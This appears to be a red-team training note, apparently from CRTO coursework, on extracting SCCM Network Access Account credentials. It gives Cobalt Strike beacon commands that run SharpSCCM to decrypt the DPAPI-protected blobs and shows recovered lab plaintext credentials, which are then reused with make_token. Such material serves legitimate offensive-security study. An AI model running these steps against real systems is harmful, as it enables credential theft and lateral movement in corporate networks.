Known as NAAs.

Domain credentials to access the SDPs over the network (instead of machine account credentials).

They are passed to the machines as part of the SCCM machine policies, which are then encrypted using DPAPI and stored locally.  If they are present, privileged users can retrieve these credential blobs via WMI or directly from disk and decrypt them to recover plaintext credentials.


#### 🖊️ Obtain Credentials

1) Use `local naa` with `-m wmi` or `-m disk`.

```
beacon> getuid
[*] You are DEV\bfarmer (admin)

beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner

[+] Connecting to \\127.0.0.1\root\ccm\policy\Machine\ActualConfig
[+] Retrieving network access account blobs via WMI
[+] Retrieving task sequence blobs via WMI
[+] Retrieving collection variable blobs via WMI

[...snip...]

[+] Decrypting network access account credentials

    NetworkAccessUsername: cyberbotic.io\sccm_svc
    NetworkAccessPassword: Cyberb0tic
```

2) These credentials should only have read access to the SDP, but are often times over privileged, try making a new session token with them and test access.

`beacon> make_token cyberbotic.io\sccm_svc Cyberb0tic`


⚠ An alternate approach is to request a copy of the policy directly from SCCM using `get naa`.  This also requires local admin on the local machine to obtain a copy of its SMS Signing and SMS Encryption certificates.




### Properties
---
📆 created   {{25-02-2024}} 11:37
🏷️ tags: #redteam #crto 

---

